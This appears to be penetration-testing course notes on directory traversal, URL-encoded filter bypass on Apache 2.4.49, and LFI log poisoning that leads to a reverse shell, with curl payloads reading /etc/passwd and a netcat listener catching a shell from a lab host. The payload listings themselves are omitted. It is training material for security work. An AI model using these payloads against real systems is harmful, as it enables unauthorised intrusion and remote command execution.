### Reviewing Microsoft Documentation

According to Microsoft documentation, the logs for IIS (Internet Information Services) are located at `C:\inetpub\logs\LogFiles\W3SVC1\`. Additionally, when dealing with an IIS web server, it is essential to check the `web.config` file located at `C:\inetpub\wwwroot\web.config`, as it may contain sensitive information such as passwords or usernames.

### Directory Traversal on Windows and Linux

In this section, we explored directory traversal techniques. On Linux, we used the `../` sequence to traverse directories. However, on Windows, backslashes (`\`) are used instead of forward slashes (`/`). Therefore, `..\` is the appropriate alternative for directory traversal on Windows targets. While the RFC (Request for Comments) specifies the use of forward slashes in URLs, some web applications running on Windows may only be vulnerable to directory traversal using backslashes. Hence, it is crucial to test both forward slashes and backslashes when examining potential directory traversal vulnerabilities on Windows.

### Encoding Special Characters

After gaining a solid understanding of directory traversal concepts using the "Mountain Desserts" web application, let's apply these skills to a real vulnerability. In the "Vulnerability Scanning" topic, we identified a directory traversal vulnerability in Apache 2.4.49. This vulnerability can be exploited by using a relative path after specifying the `cgi-bin` directory in the URL.

#### Attempting Directory Traversal in Apache 2.4.49

Let's use `curl` and multiple `../` sequences to try exploiting this directory traversal vulnerability on the WEB18 machine.

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
```

**Response:**
```
404 Not Found
Not Found
The requested URL was not found on this server.
```

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
```

**Response:**
```
404 Not Found
Not Found
The requested URL was not found on this server.
```

**Listing 138 - Using “../” to Leverage the Directory Traversal Vulnerability in Apache 2.4.49**

These attempts show that using `../` did not allow us to display the contents of `/etc/passwd` via directory traversal. Since `../` is a known method for abusing web application behavior, it is often filtered by web servers, web application firewalls, or the web application itself.

#### Bypassing Filters with URL Encoding

To potentially bypass these filters, we can use URL encoding, also known as percent encoding. We can manually encode our query using specific ASCII encoding lists or use an online converter. For now, we will only encode the dots, which are represented as `%2e`.

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**Response:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
alfred:x:1000:1000::/home/alfred:/bin/bash
```

**Listing 139 - Using Encoded Dots for Directory Traversal**

We have successfully used directory traversal with encoded dots to display the contents of `/etc/passwd` on the target machine.

URL encoding is generally used to convert characters in a web request into a format that can be transmitted over the internet. However, it is also a popular method for malicious purposes. The encoded representation of characters in a request may bypass filters that only check for plain-text representations, such as `../` but not `%2e%2e/`. After the request passes the filter, the web application or server interprets the encoded characters as a valid request.

### File Inclusion Vulnerabilities

This learning unit covers the following objectives:
- Learn the difference between File Inclusion and Directory Traversal vulnerabilities.
- Gain an understanding of File Inclusion vulnerabilities.
- Understand how to leverage Local File Inclusion (LFI) to obtain code execution.
- Explore PHP wrapper usage.
- Learn how to perform Remote File Inclusion (RFI) attacks.

### Local File Inclusion (LFI)

Before examining LFI, let's explore the differences between File Inclusion and Directory Traversal. These two concepts are often confused by penetration testers and security professionals. Misidentifying the type of vulnerability can lead to missed opportunities for code execution.

Directory traversal vulnerabilities allow us to read the contents of files outside the web server’s web root. File inclusion vulnerabilities, on the other hand, allow us to "include" a file in the application’s running code. This means we can execute local or remote files with file inclusion vulnerabilities, while directory traversal only allows us to read file contents. For example, if we exploit a directory traversal vulnerability in a PHP web application and specify the file `admin.php`, the source code of the PHP file will be displayed. With a file inclusion vulnerability, the `admin.php` file will be executed instead.

#### Exploiting LFI for Remote Code Execution (RCE)

Our goal is to obtain RCE via an LFI vulnerability using Log Poisoning. Log Poisoning involves modifying data sent to a web application so that the logs contain executable code. In an LFI scenario, the included local file is executed if it contains executable content.

In the following case study, we will write executable code to Apache’s `access.log` file in the `/var/log/apache2/` directory. First, we need to review what information is controlled by us and saved by Apache in the related log. We can either read the Apache web server documentation or display the file via LFI.

#### Analyzing the Log Entry

Let's use `curl` to analyze the elements comprising a log entry by displaying the `access.log` file using the previously found LFI vulnerability.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

**Response:**
```
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
```

**Listing 140 - Log Entry of Apache’s access.log**

The User Agent is included in the log entry. Before sending a request, we can modify the User Agent in Burp to specify what will be written to the `access.log` file.

#### Modifying the User Agent

Let's start Burp, open the browser, and navigate to the "Mountain Desserts" web page. Click on the Admin link at the bottom of the page, then switch back to Burp and click on the HTTP history tab. Select the related request and send it to Repeater.

**Figure 128: Unmodified Request in Burp Repeater**

Now, modify the User Agent to include the PHP code snippet from the following listing. This snippet accepts a command via the `cmd` parameter and executes it via the PHP `system` function on the target system. We'll use `echo` to display the command output.

**Listing 141 - PHP Snippet to Embed in the User Agent**

After modifying the User Agent, click Send.

**Figure 129: Modified Request in Burp Repeater**

The PHP code snippet is written to the `access.log` file. By including the log file via the LFI vulnerability, we can execute the PHP code snippet.

#### Executing the PHP Snippet

To execute our snippet, update the `page` parameter in the current Burp request with the relative path:

```
../../../../../../../../../var/log/apache2/access.log
```

**Listing 142 - Relative Path for the “page” Parameter**

Add the `cmd` parameter to the URL to enter a command for the PHP snippet. First, let's enter the `ps` command to verify that the log poisoning is working. Use an ampersand (`&`) as a delimiter. Remove the User Agent line from the current Burp request to avoid re-poisoning the log.

**Figure 130: Output of the Specified `ps` Command Through Log Poisoning**

**Figure 130** shows the output of the executed `ps` command that was written to the `access.log` file due to our poisoning with the PHP code snippet.

#### Handling Command Parameters

Update the `cmd` parameter with `ls -la`.

**Figure 131: Using a Command with Parameters**

The output in the Response section shows that our input triggers an error due to the space between the command and parameters. To bypass this, use URL encoding, where a space is represented as `%20`.

Replace the space with `%20` and press Send.

**Figure 132: URL Encoding a Space with %20**

**Figure 132** shows that our command executed correctly.

We have achieved command execution on the target system and can leverage this to get a reverse shell or add our SSH key to the `authorized_keys` file for a user.

#### Obtaining a Reverse Shell

Let's attempt to obtain a reverse shell by adding a command to the `cmd` parameter. Use a common Bash TCP reverse shell one-liner. Update the target IP for the reverse shell in the labs.

**Listing 143 - Bash Reverse Shell One-Liner**

Since the command will be executed through the PHP `system` function, it may be executed via the Bourne Shell (`sh`), which does not support the syntax in the reverse shell one-liner. To ensure the reverse shell is executed via Bash, modify the command by providing the one-liner as an argument to `bash -c`.

**Listing 144 - Bash Reverse Shell One-Liner Executed as Command in Bash**

Encode the special characters with URL encoding.

**Listing 145 - URL Encoded Bash TCP Reverse Shell One-Liner**

**Figure 133: Encoded Bash Reverse Shell in “cmd” Parameter**

Start a Netcat listener on port 4444 on your Kali machine before sending the request.

```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fbea640f9802:/var/www/html/meteor$ ls
admin.php
bavarian.php
css
fonts
img
index.php
js
```

**Listing 146 - Successful Reverse Shell from the Target System**

**Listing 146** shows that we successfully received the reverse shell in our Netcat listener. We now have an interactive shell on the target system.

#### LFI Attacks on Windows Targets

Exploiting LFI on Windows differs from Linux primarily in terms of file paths and code execution. The PHP code snippet used in this section for Linux also works on Windows because the PHP `system` function is independent of the underlying operating system. When using Log Poisoning on Windows, note that log files are located in application-specific paths. For example, on a target running XAMPP, the Apache logs can be found in `C:\xampp\apache\logs\`.

### Exploiting File Inclusion Vulnerabilities

Exploiting File Inclusion vulnerabilities depends on the web application’s programming language, version, and web server configuration. Outside PHP, LFI and RFI vulnerabilities can be leveraged in other frameworks or server-side scripting languages, including Perl, Active Server Pages Extended, Active Server Pages, and Java Server Pages. The exploitation process is similar across these languages.

For instance, consider an LFI vulnerability in a JSP web application. If we can write JSP code to a file using Log Poisoning and include this file with the LFI vulnerability, the code will be executed. The only difference is that the code snippet used for Log Poisoning would be in a different language.

In real-life assessments, File Inclusion vulnerabilities are most commonly discovered in PHP web applications.